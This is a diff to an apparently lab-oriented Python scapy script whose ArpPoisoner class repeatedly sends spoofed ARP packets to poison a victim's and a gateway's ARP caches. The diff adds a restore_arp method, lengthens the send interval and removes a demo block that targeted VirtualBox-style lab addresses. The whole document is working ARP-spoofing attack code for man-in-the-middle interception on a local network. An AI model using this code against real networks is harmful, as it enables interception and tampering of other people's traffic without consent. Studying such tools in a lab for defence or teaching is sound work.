@@ -1,6 +1,8 @@
 from scapy.all import *
 import multiprocessing
+import threading
 import time
+import os
 
 class ArpPoisoner(multiprocessing.Process):
 
@@ -8,7 +10,7 @@ class ArpPoisoner(multiprocessing.Process):
 
         multiprocessing.Process.__init__(self)
 
-        self.interface = interface    #enp0s3
+        self.interface = interface
         self.packets = []    #The packets which will be used to spoof
 
         self.exit = multiprocessing.Event()
@@ -41,20 +43,20 @@ class ArpPoisoner(multiprocessing.Process):
             for packet in self.packets:
                 sendp(packet, iface = self.interface, verbose=0)
             
-            time.sleep(1)
+            time.sleep(2)
+
+    def restore_arp(self, mac_attacker, mac_victim, ip_victim, mac_gateway, ip_gateway):
+        """Restores arp addresses to their original pre-spoof state."""
+        
+        #Initialize restore packets
+        restore_packet_gateway = Ether(src=mac_attacker)/ARP(op=2,hwsrc=mac_victim, hwdst=mac_gateway, psrc=ip_victim, pdst=ip_gateway)
+        restore_packet_victim = Ether(src=mac_attacker)/ARP(op=2,hwsrc=mac_gateway, hwdst=mac_victim, psrc=ip_gateway, pdst=ip_victim) 
+
+        sendp(restore_packet_gateway, iface = self.interface, verbose=0)
+        sendp(restore_packet_victim, iface = self.interface, verbose=0)
+    
+        print "Restored ARP tables"
 
     def stop(self):
         """Stops the sending of the spoofing packets."""
-
         self.exit.set()
-
-
-if __name__ == "__main__":
-    
-    arp_poisoner = ArpPoisoner("enp0s3")
-
-    arp_poisoner.create_packet("08:00:27:cc:08:6f", "08:00:27:b7:c4:af", "192.168.56.102", "192.168.56.101")
-
-    arp_poisoner.start()
-    time.sleep(5)
-    arp_poisoner.stop()
